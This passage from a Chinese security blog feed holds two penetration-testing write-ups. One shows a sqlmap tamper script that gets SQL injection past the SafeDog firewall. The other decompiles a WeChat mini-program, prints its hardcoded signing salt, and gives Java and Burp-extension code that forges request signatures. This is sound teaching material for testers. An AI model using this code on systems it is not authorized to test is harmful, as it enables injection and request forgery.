keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Replaces space character (' ') with comments '/**/'    Tested against:        * Microsoft SQL Server 2005        * MySQL 4, 5.0 and 5.5        * Oracle 10g        * PostgreSQL 8.3, 8.4, 9.0    Notes:        * Useful to bypass weak and bespoke web application firewalls    >>> tamper('SELECT id FROM users')    'SELECT/**/id/**/FROM/**/users'    """</span>    retVal <span class="token operator">=</span> payload    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> <span class="token string">""</span>        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>                    retVal <span class="token operator">+=</span> <span class="token string">"/**/"</span>                    <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token string">"/*//*/"</span>                <span class="token keyword">continue</span>            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> retVal</code></pre><p>执行命令<code>sqlmap.py -r 123.txt --tamper=test.py</code>进行注入测试，SQLMap 即可绕过安全狗成功检测出注入点：<img src="https://img-blog.csdnimg.cn/20210419014323218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" loading="lazy">但是进一步尝试使用<code>sqlmap.py -r 123.txt --tamper=test.py --dbs</code>注入读取数据库数据时失败，还需要 Fuzz 其他关键词并修改 tamper 才行！<br><img src="https://img-blog.csdnimg.cn/20210419014708555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文演示了 DVWA 靶场搭建、网站安全狗的部署、Fuzz脚本绕过安全狗、BurpSuite 用于 Fuzz、Sqlmap 修改 tamper 绕过安全狗等，在实战过程中，还经常会遇到 WAF 对于异常流量过多的源主机 IP 进行封锁，导致 SQLMap 无法正常使用，后面将继续学习如何使用 IP 代理池配合 SQLMap 进行 WAF 的绕过测试，同时也会进一步学习 SQLMap tamper 的修改场景和应用！ </p><p>本文参考以下文章：</p><ol><li><a href="https://cloud.tencent.com/developer/article/1705861">绕安全狗的那些事</a>；</li><li><a href="https://cloud.tencent.com/developer/article/1601226">对某狗的FUZZ测试</a>；</li><li><a href="https://www.freebuf.com/articles/web/234487.html">技术讨论 | Fuzz绕过安全狗4.0实现SQL注入</a>。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;在渗透测试过程中，经常会遇到很多 Web 站点部署了 WAF，这个时候使用常规的 Payload 进行 XSS、SQL 注入的检测避免不了被</summary>
      
    
    
    
    <category term="Web安全" scheme="https://tr0e.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>记一次逆向破解微信小程序参数签名</title>
    <link href="https://tr0e.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%82%E6%95%B0%E7%AD%BE%E5%90%8D/"/>
    <id>https://tr0e.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%82%E6%95%B0%E7%AD%BE%E5%90%8D/</id>
    <published>2021-02-04T09:29:23.000Z</published>
    <updated>2022-06-15T16:10:57.853Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文首发于 <a href="https://www.freebuf.com/articles/web/263394.html">Freebuf 安全社区</a>，未经许可谢绝转载！</p><p>在一个平淡无奇的午后，接到一个新的活——对某微信小程序进行渗透测试。老规矩，倒了杯茶，准备开始新一天轰轰烈烈的干活（摸鱼）。</p><p>然鹅，BurpSuite 上号不到 2 min 我就发现今天的砖头有点烫手了（晚饭可能都不香了）……事情是这样的：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210204135256163.png" alt="在这里插入图片描述" loading="lazy">没错，这货不讲武德，直接加了个时间戳参数<code>timestamp</code>、签名参数<code>signature</code>用来防止数据包重放……那这还玩个锤子！</p><p>这我还能说啥，合上电脑准备睡觉！但下一秒还是理智占据了上峰……算了，不能跟 RMB 过不去，还是老实搬砖干活为妙！</p><h1 id="小程序逆向"><a href="#小程序逆向" class="headerlink" title="小程序逆向"></a>小程序逆向</h1><p>喝口茶冷静想想，既然做了参数签名验证，那么想要继续愉快地渗透测试，必须得解决如何随意替换签名值<code>signature</code>了，那也就是说必须拿到小程序生成签名的源码。</p><p>那么问题来了。Web 网站有前端 js 代码负责这活，直接 F12 开发者工具就能查看前端代码逻辑，但是微信小程序的客户端源码上哪找？？不装了摊牌了，先前确实还没干过这活，这大概就是要现场表演下传说中的从0到1了……</p><h2 id="基础知识储备"><a href="#基础知识储备" class="headerlink" title="基础知识储备"></a>基础知识储备</h2><p>打开搜索引擎一通搜索，了解了关于微信小程序源码几个核心的扫盲问题：</p><p><strong>1、微信小程序源码如何获得？</strong></p><p> 微信小程序客户端的源文件由开发者发布后会存放在微信官方的服务器上。用户在微信客户端访问小程序后，会将其客户端源码打包下载到本地（就像APP的客户端程序），所以我们可以在手机本地找到对应小程序客户端的安装包，并进一步进行反编译获得源码。</p><p><strong>2、微信小程序安装包存放在哪？</strong></p><p> 手机本地存放微信小程序安装包的具体目录位置为：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">/</span>data<span class="token operator">/</span>data<span class="token operator">/</span>com<span class="token punctuation">.</span>tencent<span class="token punctuation">.</span>mm<span class="token operator">/</span>MicroMsg<span class="token operator">/</span><span class="token constant">XXXXXXXX</span><span class="token punctuation">(</span>命名很长的文件夹，据说是用户随机码）<span class="token operator">/</span>appbrand<span class="token operator">/</span>pkg<span class="token operator">/</span></code></pre><p>在这个目录下会发现一些 <code>xxxx.wxapkg</code> 类型的文件，这些就是微信小程序的安装包（二进制文件，还需要进一步进行反编译才能获得源码，类似获得 APP 的 APK 安装包后还需进一步进行反编译）。但是从上面的<code>/data/data</code>路径可以看出，必须 root 环境下的手机才能获取到目标文件。</p><p><strong>3、如何反编译小程序安装包？</strong></p><p>拿到 <code>xxxxx.wxapkg</code> 类型的微信小程序安装包以后，如何反编译获得小程序源码？大佬已经给我们写好现成的反编译脚本了，拿来即可食用：<a href="https://gitee.com/ksd/wxappUnpacker">wxappUnpacker </a>。</p><h2 id="逆向环境准备"><a href="#逆向环境准备" class="headerlink" title="逆向环境准备"></a>逆向环境准备</h2><p>了解完上述知识，顿时觉得这活有盼头了，撸起袖子准备干。获取源码前，先来准备下逆向环境。</p><p>1、安装 node.js 运行环境</p><p>访问 <a href="https://nodejs.org/zh-cn/download/">node 的下载地址</a>，下载安装后设置系统环境变量，成功后如下：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210204151519578.png" alt="在这里插入图片描述" loading="lazy"><br>2、下载反编译脚本文件 <a href="https://gitee.com/ksd/wxappUnpacker">wxappUnpacker </a>到本地并解压缩：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210204151748614.png" alt="在这里插入图片描述" loading="lazy"><br>然后需要运行以下命令安装对应的依赖：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> esprima<span class="token function">npm</span> <span class="token function">install</span> css-tree<span class="token function">npm</span> <span class="token function">install</span> cssbeautify    <span class="token function">npm</span> <span class="token function">install</span> vm2    <span class="token function">npm</span> <span class="token function">install</span> uglify-es    <span class="token function">npm</span> <span class="token function">install</span> js-beautify</code></pre><p>3、使用 DDMS（或者 adb、RE文件管理器）工具，从手机模拟器中找到并导出目标小程序的安装包：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210204154056998.png" alt="在这里插入图片描述" loading="lazy"></p><blockquote><p>【注意】如果发现 pkg 文件夹下当前存在的<code>xxxxx.wxapkg</code> 安装包太多，分不清是哪一个的话，可以提前清空、删除 pkg 文件夹下的<code>xxxxx.wxapkg</code>文件，再重新运行目标小程序；同时注意多点击几下程序，使得手机能够从微信服务器下载完整的安装包（本人目标程序点击后生成了如图所示的4个<code>xxxxx.wxapkg</code>文件）。</p></blockquote><p>4、将目标小程序的安装包导出到本地，完成前期的准备工作：</p><p><img src="https://img-blog.csdnimg.cn/20210204154835583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" loading="lazy"></p><h2 id="反编译出源码"><a href="#反编译出源码" class="headerlink" title="反编译出源码"></a>反编译出源码</h2><p>准备工作完成，接下来开始运行反编译脚本，对获取到的<code>xxxxx.wxapkg</code>安装包文件进行反编译，由于不知道 4 个安装包文件中哪个包含了我想要的参数签名的源码，那就只能逐个反编译出来看看了。</p><p>1、先看第一个，执行命令<code>node wuWxapkg.js + file</code>，运行脚本对目标文件进行反编译：</p><p><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210204155554283.png" alt="在这里插入图片描述" loading="lazy"><br>2、运行结果如下，报错信息提醒当前反编译的包不是程序的主安装包：</p><p><img src="https://img-blog.csdnimg.cn/20210204160036348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" loading="lazy"><br>3、既然如此，那就接着反编译下一个安装包文件，成功反编译：</p><p><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210204160836483.png" alt="在这里插入图片描述" loading="lazy"><br>4、接着到<code>xxxxx.wxapkg</code>存储路径下查看反编译成功后自动生成的存放源码的文件夹，可以看到已经成功获取到目标小程序的客户端源码：<br><img src="https://img-blog.csdnimg.cn/20210204161035807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>至此，烫手的砖头搬完一半了，可以准备点个外卖吃晚饭了~</p><h1 id="破解签名算法"><a href="#破解签名算法" class="headerlink" title="破解签名算法"></a>破解签名算法</h1><p>吃饭先搁一边，继续肝，破解完签名算法，晚饭才能吃得香哈哈（干饭人）。</p><h2 id="源码算法分析"><a href="#源码算法分析" class="headerlink" title="源码算法分析"></a>源码算法分析</h2><p>1、在 VS Code 打开源码文件夹，搜索 <code>sign</code> 关键词，发现<code>request.js</code>文件存在疑似签名函数：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210204162627777.png" alt="在这里插入图片描述" loading="lazy">2、经过审计分析，该位置确实是要找的目标签名函数，签名大致流程是 <code>MD5(固定盐值+时间戳timestamp)</code>，核心代码如下：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function-variable function">get_signature_timestamp</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">var</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>       <span class="token literal-property property">timestamp</span><span class="token operator">:</span> e<span class="token punctuation">,</span>       <span class="token literal-property property">signature</span><span class="token operator">:</span> <span class="token function">c</span><span class="token punctuation">(</span><span class="token string">"SvZy7GUy5mqWk15l4F3Ivb1IXCWOhnAm"</span> <span class="token operator">+</span> e<span class="token punctuation">)</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>3、接下来使用 MD5 在线加密验证一下，确认已成功找到签名算法：</p><p><img src="https://img-blog.csdnimg.cn/2021020416422468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" loading="lazy"><br>既然知道目标小程序如何计算签名参数了，那么接下来，就可以使用 <a href="https://tool.lu/timestamp/">在线生成时间戳的网站</a> 结合 <a href="https://www.cmd5.com/hash.aspx?s=123456">MD5 在线转换网站</a> 来计算新的签名值，然后手动替换数据包中对应的时间戳、签名值进行重放。实测发现这种做法虽然可以成功重放数据包，然而，这样子测试的话特别折腾！</p><p>难以忍受这种测试方式的龟速不说，进一步测试还发现，由于有时从浏览器复制计算出的新签名值到 BurpSuite 进行黏贴的过程手速太慢，会导致签名失效……此处猜测目标小程序的服务端应该校验了发送请求中包含的时间戳与服务器接收到请求时的时间戳之间的时间间隔，间隔太久的话则返回 400 报错。</p><h2 id="脚本计算签名"><a href="#脚本计算签名" class="headerlink" title="脚本计算签名"></a>脚本计算签名</h2><p>作为 21 世纪的新一代青年，自然不能忍受这种机械式体力活，于是乎，掏出 IDEA，编写脚本自动计算新的时间戳和签名值：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Date</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">MessageDigest</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MD5Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toMD5</span><span class="token punctuation">(</span><span class="token class-name">String</span> plainText<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//生成实现指定摘要算法的 MessageDigest 对象。</span>            <span class="token class-name">MessageDigest</span> md <span class="token operator">=</span> <span class="token class-name">MessageDigest</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"MD5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            plainText<span class="token operator">=</span><span class="token string">"SvZy7GUy5mqWk15l4F3Ivb1IXCWOhnAm"</span><span class="token operator">+</span>plainText<span class="token punctuation">;</span>            <span class="token comment">//使用指定的字节数组更新摘要。</span>            md<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>plainText<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//通过执行诸如填充之类的最终操作完成哈希计算。</span>            <span class="token keyword">byte</span> b<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> md<span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//生成具体的md5密码到buf数组</span>            <span class="token keyword">int</span> i<span class="token punctuation">;</span>            <span class="token class-name">StringBuffer</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> offset <span class="token operator">&lt;</span> b<span class="token punctuation">.</span>length<span class="token punctuation">;</span> offset<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                i <span class="token operator">=</span> b<span class="token punctuation">[</span>offset<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>                    i <span class="token operator">+=</span> <span class="token number">256</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span>                    buf<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                buf<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toHexString</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> buf<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> plainText<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 获取当前时间戳，精确到毫秒;然后计算对应的签名值</span>        <span class="token keyword">long</span> now_time<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"当前新的时间戳 timestamp："</span><span class="token operator">+</span>now_time<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> now_sign<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">MD5Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toMD5</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>now_time<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"当前新的签名值 signature："</span><span class="token operator">+</span>now_sign<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>运行脚本获得新的时间戳和签名值如下：</p><p><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210204170525870.png" alt="在这里插入图片描述" loading="lazy"><br>成功利用计算所得的新的时间戳和签名值进行数据包重放：</p><p><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210204170605552.png" alt="在这里插入图片描述" loading="lazy"></p><h2 id="插件自动替换"><a href="#插件自动替换" class="headerlink" title="插件自动替换"></a>插件自动替换</h2><p>本来到这里已经可以愉快地次饭去了，但是，作为 21 世纪的新一代青年……理应追求极致效率（说到底上面复制黏贴还是太麻烦了）！</p><p>于是乎，继续掏出 IDEA，编写 BurpSuite 插件，实现 Repeater 模块重放数据包时，会自动计算新的时间戳、签名值并自动替换，达到全自动的效果。</p><p>不废话了，直接放上插件最终的核心源码<code>BurpExtender.java</code>（关于 BurpSuite 插件编写的基础知识请自行百度……）：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">burp</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">PrintWriter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Date</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">MessageDigest</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BurpExtender</span> <span class="token keyword">implements</span> <span class="token class-name">IBurpExtender</span><span class="token punctuation">,</span> <span class="token class-name">IHttpListener</span><span class="token punctuation">&#123;</span>    <span class="token comment">// implement IBurpExtender</span>    <span class="token keyword">private</span> <span class="token class-name">PrintWriter</span> stderr<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">PrintWriter</span> stdout<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">IExtensionHelpers</span> helpers<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">registerExtenderCallbacks</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">burp<span class="token punctuation">.</span></span>IBurpExtenderCallbacks</span> callbacks<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        callbacks<span class="token punctuation">.</span><span class="token function">setExtensionName</span><span class="token punctuation">(</span><span class="token string">"My Sign Plugin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        stdout <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PrintWriter</span><span class="token punctuation">(</span>callbacks<span class="token punctuation">.</span><span class="token function">getStdout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        stderr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PrintWriter</span><span class="token punctuation">(</span>callbacks<span class="token punctuation">.</span><span class="token function">getStderr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        stdout<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Success!Enjoy it!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>helpers <span class="token operator">=</span> callbacks<span class="token punctuation">.</span><span class="token function">getHelpers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        callbacks<span class="token punctuation">.</span><span class="token function">registerHttpListener</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//processHttpMessage handle requests and responses from HttpListener</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">processHttpMessage</span><span class="token punctuation">(</span><span class="token keyword">int</span> toolFlag<span class="token punctuation">,</span> <span class="token keyword">boolean</span> messageIsRequest<span class="token punctuation">,</span> <span class="token class-name">IHttpRequestResponse</span> messageInfo<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Process only Repeater, Scanner and Intruder requests</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>toolFlag <span class="token operator">==</span> <span class="token class-name">IBurpExtenderCallbacks</span><span class="token punctuation">.</span>TOOL_SCANNER <span class="token operator">||</span>                toolFlag <span class="token operator">==</span> <span class="token class-name">IBurpExtenderCallbacks</span><span class="token punctuation">.</span>TOOL_REPEATER <span class="token operator">||</span>                toolFlag <span class="token operator">==</span> <span class="token class-name">IBurpExtenderCallbacks</span><span class="token punctuation">.</span>TOOL_INTRUDER <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>messageIsRequest<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token comment">//处理请求数据包</span>                <span class="token class-name">Handle_Request_Packet</span><span class="token punctuation">(</span>messageInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token comment">//处理返回数据包</span>                <span class="token class-name">Handle_Response_Packet</span><span class="token punctuation">(</span>messageInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//处理请求数据包</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token class-name">Handle_Request_Packet</span><span class="token punctuation">(</span><span class="token class-name">IHttpRequestResponse</span> messageInfo<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">//获取请求数据包</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> request <span class="token operator">=</span> messageInfo<span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">IRequestInfo</span> requestInfo <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">analyzeRequest</span><span class="token punctuation">(</span>messageInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//String url = requestInfo.getUrl().toString();</span>        <span class="token keyword">int</span> bodyOffset <span class="token operator">=</span> requestInfo<span class="token punctuation">.</span><span class="token function">getBodyOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//获取所有的请求头</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> headers <span class="token operator">=</span> requestInfo<span class="token punctuation">.</span><span class="token function">getHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//获取所有的请求body体</span>        <span class="token class-name">String</span> body <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>bodyOffset<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>body<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"signature"</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            stdout<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Before change：\n"</span> <span class="token operator">+</span> body<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token 